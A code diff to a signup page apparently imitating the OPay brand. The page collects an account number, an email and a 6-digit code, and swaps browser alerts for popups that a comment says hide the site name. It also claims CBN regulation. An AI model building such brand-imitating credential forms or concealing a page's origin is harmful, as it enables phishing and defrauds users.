@@ -10,6 +10,9 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     
+    <!-- SweetAlert for beautiful alerts without site name -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
     <style>
         * {
             margin: 0;
@@ -67,15 +70,15 @@
             letter-spacing: -0.3px;
         }
 
-        /* Logo */
+        /* Logo - Smaller */
         .logo-center {
             text-align: center;
             margin: 10px 0 24px;
         }
 
         .logo-center img {
-            width: 70px;
-            height: 70px;
+            width: 55px;
+            height: 55px;
             object-fit: contain;
         }
 
@@ -297,8 +300,8 @@
                 font-size: 18px;
             }
             .logo-center img {
-                width: 60px;
-                height: 60px;
+                width: 50px;
+                height: 50px;
             }
         }
     </style>
@@ -310,8 +313,7 @@
             <i class="fas fa-chevron-left"></i>
         </a>
 
-        
-        <!-- Logo Center -->
+        <!-- Logo Center - SMALLER -->
         <div class="logo-center">
             <img src="images/ppay.png" alt="OPay Logo">
         </div>
@@ -321,8 +323,6 @@
             Get your <strong>OPay Funder Account</strong> here:<br>
             <span style="font-size:8px;">We use your OPay AccNumber to create & identify your account, so enter it below.</span>
         </div>
-
-        
 
         <!-- Account Number -->
         <div>
@@ -402,6 +402,21 @@
             if (window.navigator && window.navigator.vibrate) window.navigator.vibrate(duration);
         }
 
+        // Custom alert function using SweetAlert (no site name)
+        function showAlert(icon, title, message) {
+            Swal.fire({
+                icon: icon,
+                title: title,
+                text: message,
+                confirmButtonColor: '#00B875',
+                confirmButtonText: 'OK',
+                timer: 2000,
+                showClass: {
+                    popup: 'animate__animated animate__fadeInUp'
+                }
+            });
+        }
+
         accountNumber.addEventListener('input', function(e) {
             let val = this.value.replace(/\D/g, '').slice(0, 10);
             this.value = val;
@@ -425,41 +440,42 @@
             if (val.length > 0 && val.length < 6) vibratePhone(60);
         });
 
-        signupBtn.addEventListener('click', function() {
+        signupBtn.addEventListener('click', async function() {
             const acc = accountNumber.value;
             const email = emailInput.value.trim();
             const code = codeInput.value;
             const terms = termsCheckbox.checked;
 
             if (acc.length !== 10) {
-                alert('❌ Enter 10-digit account number');
+                await showAlert('error', 'Invalid Account', 'Please enter a valid 10-digit account number');
                 vibratePhone(200);
                 accountNumber.focus();
                 return;
             }
             if (!email || !email.includes('@')) {
-                alert('❌ Valid email required');
+                await showAlert('error', 'Invalid Email', 'Please enter a valid email address');
                 vibratePhone(200);
                 emailInput.focus();
                 return;
             }
             if (code.length !== 6) {
-                alert('❌ Enter 6-digit code');
+                await showAlert('error', 'Invalid Code', 'Please enter exactly 6 digits');
                 vibratePhone(200);
                 codeInput.focus();
                 return;
             }
             if (!terms) {
-                alert('❌ Accept Terms');
+                await showAlert('warning', 'Terms Required', 'Please accept the Terms and Conditions');
                 vibratePhone(200);
                 return;
             }
 
             this.innerHTML = '<div class="spinner-sm"></div> Creating...';
             this.disabled = true;
-            setTimeout(() => {
+            
+            setTimeout(async () => {
                 localStorage.setItem('opayUser', JSON.stringify({ account: acc, email, code }));
-                alert('✅ Account created!');
+                await showAlert('success', 'Account Created!', 'Welcome to OPay Funder!');
                 window.location.href = 'login1.html';
             }, 1200);
         });
@@ -468,9 +484,10 @@
             e.preventDefault();
             window.location.href = 'login1.html';
         });
-        termsLink.addEventListener('click', (e) => {
+        
+        termsLink.addEventListener('click', async (e) => {
             e.preventDefault();
-            alert('📜 Terms: 18+ only, one account per user, CBN regulated.');
+            await showAlert('info', 'Terms & Conditions', '• You must be 18+ years old\n• One account per user\n• OPay Funder is CBN regulated\n• Use of this service implies agreement');
         });
     </script>
 </body>
